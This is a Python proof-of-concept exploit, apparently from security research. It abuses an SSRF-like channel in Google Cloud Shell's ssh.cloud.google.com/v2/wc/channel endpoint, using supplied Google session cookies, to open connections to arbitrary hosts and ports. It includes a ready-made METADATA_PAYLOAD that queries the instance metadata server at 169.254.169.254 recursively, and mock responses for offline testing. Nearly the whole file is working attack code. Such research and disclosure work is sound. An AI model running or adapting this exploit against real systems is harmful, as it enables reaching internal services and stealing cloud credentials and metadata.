#!/usr/bin/env python3

# Use it like this:
#
# cookie=$'SID=redacted; HSID=redacted; SSID=redacted; APISID=redacted; SAPISID=redacted; ...'
# ./cloud_shell_wc_channel.py -t 35.209.207.62:80 -c "$cookie" --metadata
#

import os
import argparse
import requests
import json
import sys
import base64
import time

METADATA_PAYLOAD="GET /computeMetadata/v1/?recursive=true HTTP/1.1\r\nHost: 169.254.169.254\r\nMetadata-Flavor: Google\r\n\r\n"

MOCK_CONNECTION_ESTABLISHED = '14\n[[1,["noop"]]]14\n[[2,["noop"]]]14\n[[3,["noop"]]]\n' # connection successful, no data read
MOCK_CONNECTION_REFUSED = '14\n[[1,["noop"]]]22\n[[2,[[1,[503,6,""]]]]]14\n[[3,["noop"]]]14\n[[4,["noop"]]]' # connection request was accepted by Cloud Shell, but the target service refused the connection
MOCK_RESPONSES = [
   ')]}\'\n["ssh.gg","veJUE8KlMJYLM0m8E7jkqKmPL-DRGg7OL7GjXz3t6y0"]',   # obtain gsessionid
   '51\n[[0,["c","O3G8qlg6SfK9kz63DntGkw","",8,12,30000]]]',            # obtain sid
   '8\n[0,0,7]',                                                        # (connect response) connection request accepted
   '8\n[1,1,7]',                                                        # (send response) data was accepted for delivery
   MOCK_CONNECTION_ESTABLISHED,                                        
   '73\n[[1,[[2,null,"U1NILTIuMC1PcGVuU1NIXzguNQ0K"]]],[2,["noop"]],[3,["noop"]]]14\n[[4,["noop"]]]'  # some data delivered
]


def eprint(*args, **kwargs):
    print(*args, **kwargs, file=sys.stderr)

def b64ue_enc(s):
    return base64.urlsafe_b64encode(s).decode().rstrip("=")

def b64ue_dec(s):
    sb = s.encode()
    return base64.urlsafe_b64decode(sb + b'=' * (-len(sb) % 4))

#https://stackoverflow.com/questions/20658572/python-requests-print-entire-http-request-raw
def pretty_print_request(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in 
    this function because it is programmed to be pretty 
    printed and may differ from the actual request.
    """
    eprint('{}\n{}\r\n{}\r\n\r\n{}\n{}\n\n'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body if req.body else "",
        '------------END------------',
    ))

def parse_json_stream(data):
    # algo: find first \n, atoi the number before, read n bytes of data, repeat with the remaining
    re = []
    while data != "":
        (prefix, remainder) = data.split("\n", 1)
        if not prefix and not remainder:
            break
        l = int(prefix)
        cur = remainder[:l]
        re.append(json.loads(cur))
        data = remainder[l:]
    return re

def parse_json_stream_test():
    input = '51\n[[0,["c","O3G8qlg6SfK9kz63DntGkw","",8,12,30000]]]\n'
    expected = [[[0,["c","O3G8qlg6SfK9kz63DntGkw","",8,12,30000]]]]
    assert parse_json_stream(input) == expected
    input += "3\n[1]"
    expected = [[[0,["c","O3G8qlg6SfK9kz63DntGkw","",8,12,30000]]],[1]]
    assert parse_json_stream(input) == expected

class CloudShellWcChannel:
    def __init__(self, cookie):
        self.cookie = cookie
        self.gsessionid = ""
        self.sid = ""
        self.rs = requests.Session()
        self.rid = 93488
        self.mock = 0
        self.ofs = 0
        
    def _send_wc_request(self, uri, *args, **kwargs):
        puri = uri
        uri = uri.replace("[rid]", str(self.rid))
        if puri != uri:
            self.rid += 1
        method = kwargs.get("method") or "GET"
        if kwargs.get("json") or kwargs.get("data"):
            method = "POST"
        req = requests.Request(*args, url='https://ssh.cloud.google.com/v2/wc/'+uri, method=method, headers={"Cookie": self.cookie}, **kwargs)
        prepared = req.prepare()
        if os.getenv("DEBUG"):
            pretty_print_request(prepared)
        if os.getenv("MOCK"):
            re = MOCK_RESPONSES[self.mock]
            self.mock += 1
        else:
            resp = self.rs.send(prepared)
            re = resp.content.decode()
        if os.getenv("DEBUG"):
            eprint("Response:", re, "\n\n")
        return re

    def _send_wc_json_request(self, uri, *args, **kwargs):
        # this needs stripping leading )]}'
        resp_content = self._send_wc_request(uri, *args, **kwargs)
        try:
            json_content = resp_content[4:]
            return json.loads(json_content)
        except:
            eprint("Unable to read response as JSON to", uri, resp.content)
            raise

    def _send_wc_stream_request(self, uri, *args, **kwargs):
        # there is a length prefix for each json chunk here
        resp_content = self._send_wc_request(uri, *args, **kwargs)
        return parse_json_stream(resp_content)

    def _obtain_gsessionid(self):
        resp = self._send_wc_json_request('gsessionid?authuser=0')
        # example response: ["ssh.gg","veJUE8KlMJYLM0m8E7jkqKmPL-DRGg7OL7GjXz3t6y0"]
        return resp[1]

    def _obtain_sid(self):
        resp = self._send_wc_stream_request(f'channel?VER=8&gsessionid={self.gsessionid}&RID=[rid]&CVER=22&t=1', data={"count":0})
        #print(json.dumps(resp))
        # example response: [[0,["c","O3G8qlg6SfK9kz63DntGkw","",8,12,30000]]]
        return resp[0][0][1][1]

    def _get_ofs(self):
        re = self.ofs
        self.ofs+= 1
        return re

    def _connect(self, target):
        resp = self._send_wc_stream_request(f'channel?VER=8&gsessionid={self.gsessionid}&SID={self.sid}&RID=[rid]&AID=0&t=1', data={"count":1, "ofs": self._get_ofs(), "req0_data": f'[1,["{target}"]]'})
        # should return [0,0,7] (regardless the connection is successulf or not - it is async)
        if resp != [[0,0,7]]:
            raise Exception("The connection request was rejected: "+json.dumps(resp))

    def send(self, payload):
        """ payload is supposed to be a bytes like object """
        b64str = b64ue_enc(payload)
                                                                                                                                                                      # [2,null,"b64"]
        resp = self._send_wc_stream_request(f'channel?VER=8&gsessionid={self.gsessionid}&SID={self.sid}&RID=[rid]&AID=1&t=1', data={"count":1, "ofs": self._get_ofs(), "req0_data": f'[2,null,"{b64str}"]'})
        # should return something like [1,1,7] where the last number should be 7
        if resp[0][2] != 7:
            raise Exception("Couldn't send data: "+json.dumps(resp))

    def recv(self):
        resp = self._send_wc_stream_request(f'channel?VER=8&gsessionid={self.gsessionid}&SID={self.sid}&RID=rpc&TYPE=xmlhttp&CI=0&AID=0&t=1')

        # print(json.dumps(resp, indent=4))
        for r in resp:
            some_struct = r[0][1][0]
            if "noop" == some_struct:
                continue
            if some_struct[1] and 503 == some_struct[1][0]:
                raise ConnectionAbortedError("Connection has closed.")

            b64str = some_struct[2]
            act = b64ue_dec(b64str)
            yield act


    def establish(self, target):
        self.gsessionid = self._obtain_gsessionid()
        self.sid = self._obtain_sid()
        # print("SID:", self.sid)
        self._connect(target)

def do_the_job(args):
    if args.metadata:
        args.payload = METADATA_PAYLOAD
    ch = CloudShellWcChannel(args.cookie)
    ch.establish(args.target)
    if args.payload:
        ch.send(args.payload.encode())
    try:
        while True:
            for bin in ch.recv():
                sys.stdout.buffer.write(bin)
    except ConnectionAbortedError:
        pass

if __name__ == "__main__":
    # parse_json_stream_test(); sys.exit()
    
    parser = argparse.ArgumentParser(description="PoC exploit to the Cloud Shell v2/wc/channel SSRF feature")
    parser.add_argument("-c", "--cookie", required=True, help="Cookie string along with SID HSID and the others needed for auth")
    parser.add_argument("-t", "--target", required=True, help="Destination to connect to (ip:port)")
    parser.add_argument("-p", "--payload", help="Data to send. You can use the special value METADATA to send a HTTP query to the metadata server")
    parser.add_argument("--metadata", action="store_true", help="Shortcut to send request to metadata server's /computeMetadata/v1/?recursive=true")
    args = parser.parse_args()
    
    do_the_job(args)
